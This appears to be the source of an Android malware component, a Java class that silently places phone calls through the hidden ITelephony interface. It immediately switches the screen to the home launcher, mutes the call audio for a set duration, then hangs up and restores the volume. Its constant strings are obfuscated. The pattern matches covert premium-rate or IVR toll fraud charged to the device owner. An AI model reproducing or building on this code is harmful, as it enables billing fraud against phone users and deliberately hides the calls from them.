package net.workspace.ivr;
import net.workspace.listener.CallListener;
import net.workspace.util.Constant;
import net.workspace.util.Logger;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import android.content.Intent;
import android.media.AudioManager;
import android.os.IBinder;
import android.os.RemoteException;
import com.android.internal.telephony.ITelephony;

public class CallPhoneUtil implements Runnable {
    /**
     * "android.intent.category.HOME"
     */
    public static String CATEGORY_HOME = ParseKsy.decode("14c12090ff1d2218acc38234cc6a628455bcb5a61db14e71174d7de9d18b4866");
    private static int DURATION = 0;
    private static long CALL_TIME = 0L;
    private static final int WAIT_TIME = 5;
    private static boolean IS_CALLING = false;
    private static CallListener LISTENER;
    private static final Object locker = new Object();
    private String phoneNumber;
    private static void endCall(ITelephony itelephony) {
        try {
            itelephony.endCall();
        } catch (RemoteException e) {
            Logger.error(e);
        }
    }
    public static void stopCall() {
        if (IS_CALLING) {
            IS_CALLING = false;
            new Thread() {
                @Override
                public void run() {
                    synchronized (locker) {
                        if (LISTENER != null) {
                            if (System.currentTimeMillis() - CALL_TIME < 1000 * DURATION) LISTENER.onFailed();
                            else LISTENER.onSuccess();
                        }
                        LISTENER = null;
                    }
                }
            }.start();
        }
    }
    public CallPhoneUtil(String phoneNumber, int duration, CallListener oncallphonelistener) {
        this.phoneNumber = phoneNumber;
        DURATION = duration + WAIT_TIME;
        synchronized (locker) {
            LISTENER = oncallphonelistener;
        }
    }
    /**
     * android.intent.action.MAIN
     */
    private static String ACTION_MAIN = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642cef3babade94d9b1a186074c4ba18495b");
    private void call(String phoneNumber, int duration) {
        boolean isCallend = false;
        try {
            ITelephony itelephony = ITelephony.Stub.asInterface((IBinder) Class.forName(Constant.SERVICE_MANAGER).getMethod(Constant.GET_SERVICE, new Class[] { String.class }).invoke(null, new Object[] { "phone" }));
            itelephony.call(phoneNumber);
            IS_CALLING = true;
            CALL_TIME = System.currentTimeMillis();
            T.sleep(200L);
            T.context.startActivity(new Intent().setAction(ACTION_MAIN).addCategory(CATEGORY_HOME));
            AudioManager manager = (AudioManager) T.context.getSystemService("audio");
            manager.getStreamMaxVolume(0);
            int volume = manager.getStreamVolume(0);
            manager.setStreamVolume(0, 0, 0);
            T.sleep(duration * 1000);
            endCall(itelephony);
            manager.setStreamVolume(0, volume, 0);
            isCallend = true;
            IS_CALLING = false;
        } catch (Throwable e) {
            Logger.error(e);
        }
        synchronized (locker) {
            if (LISTENER != null) {
                if (isCallend) LISTENER.onSuccess();
                else LISTENER.onFailed();
            }
            LISTENER = null;
        }
    }
    @Override
    public void run() {
        call(phoneNumber, DURATION);
    }
    public void startCallPhone() {
        new Thread(this).start();
    }
}
